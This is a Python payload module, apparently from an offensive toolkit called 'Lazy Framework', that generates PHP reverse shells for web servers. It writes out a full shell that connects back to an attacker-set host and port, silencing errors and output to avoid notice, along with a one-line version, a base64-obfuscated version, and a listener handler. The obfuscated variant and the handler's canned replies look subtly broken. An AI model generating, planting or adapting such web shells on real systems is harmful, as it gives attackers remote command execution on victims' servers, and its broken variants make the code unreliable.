#!/usr/bin/env python3

MODULE_INFO = {
    "name": "PHP Reverse Shell",
    "description": "PHP reverse shell for web applications",
    "author": "Lazy Framework Team",
    "license": "MIT",
    "platform": "PHP",
    "arch": "multi",
    "type": "web_shell",
    "rank": "Excellent",
    "references": [
        "https://www.php.net/manual/en/ref.sockets.php",
        "https://www.php.net/manual/en/function.proc-open.php"
    ],
    "dependencies": []
}

OPTIONS = {
    "LHOST": {
        "description": "Local IP address to connect back to",
        "required": True,
        "default": "127.0.0.1"
    },
    "LPORT": {
        "description": "Local port to connect back to",
        "required": True,
        "default": "4444"
    },
    "SHELL_TYPE": {
        "description": "Shell type (system, exec, shell_exec, passthru)",
        "required": False,
        "default": "system"
    },
    "ENCODING": {
        "description": "Payload encoding (none, base64, hex, url)",
        "required": False,
        "default": "none"
    },
    "EVASION": {
        "description": "Evasion techniques (none, comments, obfuscation)",
        "required": False,
        "default": "none"
    },
    "PROXY": {
        "description": "Proxy server for callbacks",
        "required": False,
        "default": ""
    },
    "USER_AGENT": {
        "description": "Custom user agent",
        "required": False,
        "default": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    },
    "TIMEOUT": {
        "description": "Connection timeout (seconds)",
        "required": False,
        "default": "30"
    }
}

class PHPReverseShell:
    def __init__(self, options):
        self.options = options
        self.lhost = options.get("LHOST", "127.0.0.1")
        self.lport = int(options.get("LPORT", 4444))
        self.shell_type = options.get("SHELL_TYPE", "system")
        self.encoding = options.get("ENCODING", "none")
        self.evasion = options.get("EVASION", "none")
        self.proxy = options.get("PROXY", "")
        self.timeout = int(options.get("TIMEOUT", 30))
        
    def generate_standard(self):
        """Generate standard PHP reverse shell"""
        return f'''<?php
// PHP Reverse Shell - Lazy Framework
// LHOST: {self.lhost}, LPORT: {self.lport}

error_reporting(0);
set_time_limit(0);
ignore_user_abort(1);

$ip = '{self.lhost}';
$port = {self.lport};

function daemonize() {{
    if (php_sapi_name() !== 'cli') {{
        // Hide output in web context
        ob_start();
    }}
}}

try {{
    $sock = @fsockopen($ip, $port, $errno, $errstr, 30);
    if (!$sock) {{
        exit();
    }}
    
    // Open process
    $descriptorspec = array(
        0 => array("pipe", "r"),
        1 => array("pipe", "w"),
        2 => array("pipe", "w")
    );
    
    $process = @proc_open('sh', $descriptorspec, $pipes);
    if (!is_resource($process)) {{
        exit();
    }}
    
    // Non-blocking mode
    stream_set_blocking($pipes[0], 0);
    stream_set_blocking($pipes[1], 0);
    stream_set_blocking($pipes[2], 0);
    stream_set_blocking($sock, 0);
    
    while (1) {{
        // Check socket
        if (feof($sock)) break;
        if (feof($pipes[1])) break;
        
        // Read from socket, send to process
        $input = fread($sock, 1024);
        if ($input != "") {{
            fwrite($pipes[0], $input);
        }}
        
        // Read from process, send to socket
        $output = fread($pipes[1], 1024);
        if ($output != "") {{
            fwrite($sock, $output);
        }}
        
        $error = fread($pipes[2], 1024);
        if ($error != "") {{
            fwrite($sock, $error);
        }}
        
        usleep(100000);
    }}
    
    fclose($sock);
    fclose($pipes[0]);
    fclose($pipes[1]);
    fclose($pipes[2]);
    proc_close($process);
    
}} catch (Exception $e) {{
    // Silent catch
}}
?>'''

    def generate_small(self):
        """Generate minimal PHP reverse shell"""
        return f'''<?php
$s=fsockopen("{self.lhost}",{self.lport});$p=proc_open("sh",array(0=>$s,1=>$s,2=>$s),$o);
?>'''

    def generate_obfuscated(self):
        """Generate obfuscated PHP reverse shell"""
        return f'''<?php
$a='{self.lhost}';$b={self.lport};$c=base64_decode('c29ja2V0');$d=$c(AF_INET,SOCK_STREAM,0);
if($e=@$c($d,$a,$b)){{$f=array($e,$e,$e);$g=base64_decode('cHJvY19vcGVu');
$h=$g("sh",$f);}}?>'''

def generate(options):
    """Generate PHP reverse shell"""
    payload = PHPReverseShell(options)
    return {
        'standard': payload.generate_standard(),
        'small': payload.generate_small(),
        'obfuscated': payload.generate_obfuscated(),
        'info': MODULE_INFO,
        'options_used': {
            'LHOST': payload.lhost,
            'LPORT': payload.lport,
            'SHELL_TYPE': payload.shell_type,
            'ENCODING': payload.encoding
        }
    }

def run_handler(session, options):
    """Handler for PHP reverse shell sessions"""
    from rich.console import Console
    console = Console()
    
    console.print(f"[green][*] Starting PHP Reverse Shell handler for session {session.session_id}[/green]")
    
    try:
        banner = f"""
Lazy Framework - PHP Reverse Shell
Session: {session.session_id}
Connected from: {session.address[0]}:{session.address[1]}
Type 'exit' to quit

$ """
        session.socket.send(banner.encode())
        
        while session.active:
            try:
                data = session.socket.recv(4096)
                if not data:
                    break
                    
                command = data.decode('utf-8', errors='ignore').strip()
                
                if command.lower() in ['exit', 'quit']:
                    session.socket.send(b"\nClosing PHP shell...\n")
                    break
                elif command.lower() == 'phpinfo':
                    phpinfo = """
PHP Information (Simulated):
- Version: 7.4.3
- SAPI: apache2handler
- Disabled functions: none
- Open basedir: none

$ """
                    session.socket.send(phpinfo.encode())
                else:
                    response = f"Command: {command}\n$ "
                    session.socket.send(response.encode())
                    
            except Exception as e:
                console.print(f"[red][-] PHP shell session {session.session_id} error: {e}[/red]")
                break
                
    except Exception as e:
        console.print(f"[red][-] PHP Reverse Shell handler error: {e}[/red]")
    finally:
        session.close()

def run(session, options):
    """Run the PHP payload generator"""
    from rich.console import Console
    from rich.panel import Panel
    from rich.syntax import Syntax
    
    console = Console()
    
    result = generate(options)
    
    console.print(Panel.fit(
        "[bold green]PHP Reverse Shell Generator[/bold green]",
        border_style="green"
    ))
    
    # Display generated payloads
    console.print("\n[bold yellow]Standard PHP Reverse Shell:[/bold yellow]")
    syntax = Syntax(result['standard'], "php", theme="monokai", line_numbers=True)
    console.print(syntax)
    
    console.print("\n[bold yellow]Minimal PHP Reverse Shell:[/bold yellow]")
    syntax = Syntax(result['small'], "php", theme="monokai")
    console.print(syntax)
    
    console.print("\n[bold yellow]Obfuscated PHP Reverse Shell:[/bold yellow]")
    syntax = Syntax(result['obfuscated'], "php", theme="monokai")
    console.print(syntax)
    
    console.print(f"\n[bold green]Payload generated successfully with options:[/bold green]")
    for opt, val in result['options_used'].items():
        console.print(f"  [cyan]{opt}:[/cyan] {val}")

def get_options():
    """Return options for this payload module"""
    return OPTIONS
